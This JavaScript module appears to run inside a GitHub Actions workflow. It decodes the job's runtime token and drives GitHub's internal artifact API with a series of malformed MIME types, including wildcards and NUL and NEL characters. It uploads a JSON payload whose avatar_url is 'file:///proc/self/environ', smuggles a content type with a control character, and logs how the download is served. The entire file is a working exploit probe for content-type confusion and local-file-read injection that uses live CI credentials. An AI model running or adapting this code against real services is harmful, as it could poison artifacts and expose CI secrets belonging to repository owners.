module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, run, job] = scope.split(':');
  const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
  const base = `${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const cases = [
    ['wildcard-both', '*/*'],
    ['wildcard-app', 'application/*'],
    ['wildcard-json-suffix', 'application/*+json'],
    ['octet', 'application/octet-stream'],
    ['custom', 'application/x-repo-cassette'],
    ['json-param', 'application/json; charset=utf-8'],
    ['json-upper', 'Application/JSON'],
    ['json-nul', 'application/json\u0000'],
    ['json-nul-nel', 'application/json\u0000\u0085'],
    ['nul-json', '\u0000application/json'],
    ['json-control', 'application/json'],
  ];
  async function twirp(method, payload) {
    const r = await fetch(base + method, {
      method: 'POST',
      headers: {Authorization: `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
    return {status: r.status, value: await r.json().catch(() => ({}))};
  }
  for (const [label, mime] of cases) {
    const name = `cassette-wild-${context.runId}-${label}`;
    try {
      const c = await twirp('CreateArtifact', {...ids, name, version: 7, mime_type: mime});
      const upload = c.value.signed_upload_url || c.value.signedUploadUrl;
      if (!c.value.ok || !upload) {
        console.log('CASE', JSON.stringify({label, mime, create: c.status, message: c.value.msg || ''}));
        continue;
      }
      const body = Buffer.from('{"full_name":"test/test","owner":{"avatar_url":"file:///proc/self/environ"}}');
      const put = await fetch(upload, {
        method: 'PUT',
        headers: {'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': 'application/json\u0085', 'Content-Length': String(body.length)},
        body,
      });
      if (put.status !== 201) {
        console.log('CASE', JSON.stringify({label, mime, create:c.status, put:put.status, code:put.headers.get('x-ms-error-code')}));
        continue;
      }
      const f = await twirp('FinalizeArtifact', {...ids, name, size:String(body.length)});
      const id = String(f.value.artifact_id || f.value.artifactId || '');
      if (!f.value.ok || !/^\d+$/.test(id)) {
        console.log('CASE', JSON.stringify({label, mime, create:c.status, put:put.status, finalize:f.status, message:f.value.msg || ''}));
        continue;
      }
      const rest = await fetch(`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`, {
        redirect:'manual', headers:{Authorization:`Bearer ${process.env.GH_TOKEN}`, Accept:'application/vnd.github.v3+json'},
      });
      const loc = rest.headers.get('location');
      const rsct = loc ? new URL(loc).searchParams.get('rsct') : null;
      let rawStatus=null, rawType=null, bodyMatch=null;
      if (loc) {
        const raw=await fetch(loc);
        rawStatus=raw.status; rawType=raw.headers.get('content-type');
        bodyMatch=Buffer.from(await raw.arrayBuffer()).equals(body);
      }
      console.log('CASE', JSON.stringify({label,mime,id,create:c.status,put:put.status,finalize:f.status,rest:rest.status,rsct,rawStatus,rawType,bodyMatch}));
    } catch (e) {
      console.log('CASE', JSON.stringify({label,mime,error:String(e).slice(0,180)}));
    }
  }
};
